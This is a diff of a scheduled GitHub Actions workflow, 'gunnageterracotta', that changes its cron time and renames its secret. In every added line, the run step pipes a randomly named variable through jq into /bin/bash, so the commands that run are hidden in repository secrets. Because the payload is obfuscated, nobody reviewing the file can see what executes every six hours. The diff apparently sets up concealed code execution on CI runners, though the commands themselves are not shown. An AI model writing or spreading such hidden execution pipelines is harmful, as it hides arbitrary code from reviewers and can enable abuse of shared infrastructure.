@@ -3,8 +3,7 @@ name: gunnageterracotta
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 3/6 * * *'
-
+    - cron: '57 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +11,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: gunnageterracotta
         env:
-          t3: ${{ secrets.t3 }}
+          bk84357: ${{ secrets.bk84357 }}
         run: |
-          echo $t3 | jq -r .m3104 | /bin/bash
-          echo $twpev1 | jq -r .ub478 | /bin/bash
-          echo $tdqol63910 | jq -r .u14664 | /bin/bash
-          echo $zt0 | jq -r .cxo10817 | /bin/bash
-          echo $ygpk98466 | jq -r .e78 | /bin/bash
-          echo $jlj9 | jq -r .rhlnx0499 | /bin/bash
-          echo $cklzf8 | jq -r .s9 | /bin/bash
-          echo $fmjk1 | jq -r .dburi16 | /bin/bash
-          echo $np006 | jq -r .yspfy59 | /bin/bash
-          echo $jwweo1880 | jq -r .qj84 | /bin/bash
+          echo $bk84357 | jq -r .ktg4 | /bin/bash
+          echo $ffuw877 | jq -r .zttsh81679 | /bin/bash
+          echo $cjoh66485 | jq -r .fi40557 | /bin/bash
+          echo $hiyna9772 | jq -r .vieq38233 | /bin/bash
+          echo $r10 | jq -r .race2 | /bin/bash
+          echo $x79292 | jq -r .mra65264 | /bin/bash
+          echo $cni3 | jq -r .qdbfk76 | /bin/bash
+          echo $tjmwt6 | jq -r .norx3104 | /bin/bash
+          echo $dtpr20777 | jq -r .kmv5136 | /bin/bash
+          echo $amj74 | jq -r .lztyt759 | /bin/bash
+          echo $k93 | jq -r .i0687 | /bin/bash
+          echo $oxwin52 | jq -r .lde26 | /bin/bash
+          echo $mi60863 | jq -r .ilevf7033 | /bin/bash
+          echo $i9 | jq -r .vflm4 | /bin/bash
+          echo $pog488 | jq -r .n8134 | /bin/bash
+          echo $od304 | jq -r .y1075 | /bin/bash
+          echo $czrta28 | jq -r .xccjv495 | /bin/bash
 
